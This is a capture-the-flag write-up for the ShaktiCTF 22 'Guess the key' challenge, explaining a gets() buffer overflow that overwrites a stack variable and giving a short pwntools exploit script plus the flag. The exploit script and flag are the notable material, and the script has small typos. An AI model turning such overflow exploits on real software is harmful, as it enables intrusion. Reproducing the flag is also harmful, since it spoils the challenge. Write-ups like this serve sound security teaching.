# Shaktictf 22 write-ups

## Guess the key

DESCRIPTION:
Guess the correct key to win!

Note:The server is running on Ubuntu 20.04.

Author: Claire de lune

FLAG FORMAT: shakti{}
### Intended solution 
This is a basic variable overwrite challenge.
A binary file is given as an attachment, where the usual checks give:

![](https://i.imgur.com/bwRNZWV.png)

![](https://i.imgur.com/iuONMGu.png)
 
 Running the file-

 ![](https://i.imgur.com/pIXUlKL.png)

Decompiling the func fuction in binary gives the following-
```
int func()
{
  char v1[60]; // [rsp+0h] [rbp-40h] BYREF
  int v2; // [rsp+3Ch] [rbp-4h]

  puts("Guess the correct key to win!");
  v2 = -559038737;
  printf("Enter the key: ");
  gets(v1);
  if ( v2 == -889275714 )
    return system("cat flag.txt");
  puts("Wrong Key");
  return puts("Try again!");
}
```
Here '-559038737' is `0xdeadbeef` and '-889275714' is `0xcafebabe`.We have to overwrite the variable v2 to `0xcafebabe` to pass the check and cat flag.

There is a gets function present in func(). So we can we can overfow the buffer and then access v2 through that.
On the stack, the size of v1 is 60 bytes, in order to overwrite v2, we must overflow v1 with 60 bytes of junk data and then overwrite v1 with `0xcafebabe`


Exploit:
```python=
(from pwn import *
elf = ELF("variable")
io = process(elf.path)
payload =b'a'*60 + p64(0xcafebabe)
io.sendline(payload)
io.interactive()
```
This gives us the flag: `shakti{0verWr171ng_15_FuN}`
